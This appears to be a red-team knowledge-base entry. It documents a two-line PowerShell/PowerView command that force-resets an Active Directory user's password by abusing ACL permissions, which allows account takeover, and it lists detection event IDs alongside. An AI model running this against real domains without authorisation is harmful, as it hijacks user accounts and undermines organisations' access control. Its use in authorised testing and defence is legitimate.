---
type: code
language: powershell
verified: true
platforms:
  - Windows
tags:
  - active-directory
  - password-change
  - powerview
validated: true
---

# PowerShell-Set-Domain-User-Password

## Code

```powershell
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
```

## Description

This PowerShell code snippet uses the PowerView module to force change a domain user's password by leveraging ACL permissions on the user object. It prepares a secure string from plaintext and applies it via LDAP, enabling account takeover without the original password.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'Password123!' | New plaintext password (replace with strong password) | 'SecureNewPass123!' |
| 'TargetUser' | Target domain username (sAMAccountName) | 'jdoe' |

## Usage

Load PowerView first (e.g., .\PowerView.ps1), then execute in an elevated PowerShell session with domain creds. Use after confirming ACL permissions with Get-DomainObjectAcl. Ideal for post-exploitation in red team engagements targeting misconfigured AD.

## Detection

- Monitor Event ID 4724 (An attempt was made to reset an account's password) in Security logs on Domain Controllers.
- PowerShell ScriptBlock logging captures the Set-DomainUserPassword invocation.
- LDAP modify operations on user objects via directory service auditing (Event ID 5136).
- Anomalous password changes for high-privilege accounts.

## Related

- [[procedures/Force-Change-Domain-User-Password-via-ACL-Abuse]]
- [[tools/PowerView]]
